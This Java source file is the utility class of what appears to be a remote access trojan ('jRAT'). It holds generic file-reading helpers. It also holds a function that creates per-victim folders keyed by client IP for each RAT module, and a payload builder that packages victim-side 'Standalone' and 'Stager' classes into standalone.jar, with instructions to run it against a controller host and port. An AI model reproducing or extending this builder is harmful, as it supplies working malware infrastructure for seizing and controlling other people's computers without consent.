package jRAT.server;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;

public class JRATUtils {

    private static int BUFFER_SIZE = 1024;

    /* ------------------------------------------------------------------------------------------ */

    public static byte[] loadModuleBytes(String classPath)
    { 
        byte[] rawFileBytes = null;
        InputStream input = null;
        ByteArrayOutputStream output = null;
        try
        {
            input  = JRATUtils.class.getResourceAsStream(classPath);
            output = new ByteArrayOutputStream();

            final byte[] buffer = new byte[BUFFER_SIZE];
            int numberOfBytesRead;
            while ((numberOfBytesRead = input.read(buffer)) != -1)
            {
                output.write(buffer, 0, numberOfBytesRead);
            }
            output.flush();
            rawFileBytes = output.toByteArray();
        }
        catch (Exception ex) {}
        finally
        {
            try { if (input != null) input.close(); }
            catch (Exception ex) {}

            try { if (output != null) output.close(); }
            catch (Exception ex) {}
        }
        return rawFileBytes;
    }

    /* ------------------------------------------------------------------------------------------ */

    public static byte[] readBytesFromFile(final String filePath)
    {
        byte[] rawFileBytes = null;
        FileInputStream input = null;
        ByteArrayOutputStream output = null;
        try
        {
            input  = new FileInputStream(new File(filePath));
            output = new ByteArrayOutputStream();

            final byte[] buffer = new byte[BUFFER_SIZE];
            int numberOfBytesRead;
            while ((numberOfBytesRead = input.read(buffer)) != -1)
            {
                output.write(buffer, 0, numberOfBytesRead);
            }
            output.flush();
            rawFileBytes = output.toByteArray();
        }
        catch (Exception ex) {}
        finally
        {
            try { if (input != null) input.close(); }
            catch (Exception ex) {}

            try { if (output != null) output.close(); }
            catch (Exception ex) {}
        }
        return rawFileBytes;
    }

    /* ------------------------------------------------------------------------------------------ */

    public static boolean saveBytesToFile(String filePath, byte[] data)
    {
        boolean STATUS = true;
        ByteArrayInputStream input = null;
        FileOutputStream output = null;
        try
        {
            input  = new ByteArrayInputStream(data);
            output = new FileOutputStream(new File(filePath));

            final byte[] buffer = new byte[BUFFER_SIZE];
            int numberOfBytesRead;
            while ((numberOfBytesRead = input.read(buffer)) != -1)
            {
                output.write(buffer, 0, numberOfBytesRead);
            }
            output.flush();
        }
        catch (Exception ex) { STATUS = false; }
        finally
        {
            try { if (input != null) input.close(); }
            catch (Exception ex) {}

            try { if (output != null) output.close(); }
            catch (Exception ex) {}  
        }
        return STATUS;
    }

    /* ------------------------------------------------------------------------------------------ */

    /* Each module has it's directory for files */
    public static boolean createVictimDirectories(String clientIP)
    {   
        List<String> names = JRATServer.getOfficialModuleNames();   
        boolean STATUS = true;
        try
        {
            Files.createDirectories(Paths.get(clientIP));
            Iterator iterator = names.iterator();
            while (iterator.hasNext())
                Files.createDirectories(Paths.get(clientIP + "/" + iterator.next()));
        }
        catch (IOException ex) { STATUS = false; }
        return STATUS;
    }

    /* ------------------------------------------------------------------------------------------ */

    public static void dumpStandalonePayload()
    {
        JarOutputStream outputJAR = null;
        InputStream input = null;
        OutputStream output = null;

        try
        {
            Manifest manifest = new Manifest();
            manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, "jRAT.victim.Standalone");
        
            output    = new FileOutputStream(new File("standalone.jar"));
            outputJAR = new JarOutputStream(output, manifest);

            final byte[] buffer = new byte[BUFFER_SIZE];
            int numberOfBytesRead;
            JarEntry jarEntry;
      
            jarEntry = new JarEntry("jRAT/victim/Standalone.class");
            jarEntry.setTime(Calendar.getInstance().getTimeInMillis());
            outputJAR.putNextEntry(jarEntry);
            input = JRATUtils.class.getResourceAsStream("/jRAT/victim/Standalone.class");
            while ((numberOfBytesRead = input.read(buffer)) != -1)
            {
                outputJAR.write(buffer, 0, numberOfBytesRead);
            }
            outputJAR.closeEntry();
            input.close();

            jarEntry = new JarEntry("jRAT/victim/Stager.class");
            jarEntry.setTime(Calendar.getInstance().getTimeInMillis());
            outputJAR.putNextEntry(jarEntry);
            input = JRATUtils.class.getResourceAsStream("/jRAT/victim/Stager.class");
            while ((numberOfBytesRead = input.read(buffer)) != -1)
            {
                outputJAR.write(buffer, 0, numberOfBytesRead);
            }
            outputJAR.closeEntry();
            input.close();
            
            System.out.println("=> Generated standalone.jar");
            System.out.println("=> RUN AS: java -jar standalone.jar <host> <port>");
        }
        catch (Exception ex) {}
        finally
        {
            try { outputJAR.close(); output.close(); }
            catch (Exception ex) {}
        }
    }

    /* ------------------------------------------------------------------------------------------ */

    public static byte[] readClassBytes(InputStream in, ZipEntry entry) throws IOException
    {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        long size = entry.getSize();
        if (size > -1)
        {
            byte[] buffer = new byte[BUFFER_SIZE];
            int n = 0;
            long count = 0;
            while (-1 != (n = in.read(buffer)) && count < size)
            {
                output.write(buffer, 0, n);
                count += n;
            }
        }
        else
        {
            while (true) 
            {
                int b = in.read();
                if (b == -1)
                    break;
                output.write(b);
            }
        }
        output.close();
        return output.toByteArray();
    }

    /* ------------------------------------------------------------------------------------------ */

}
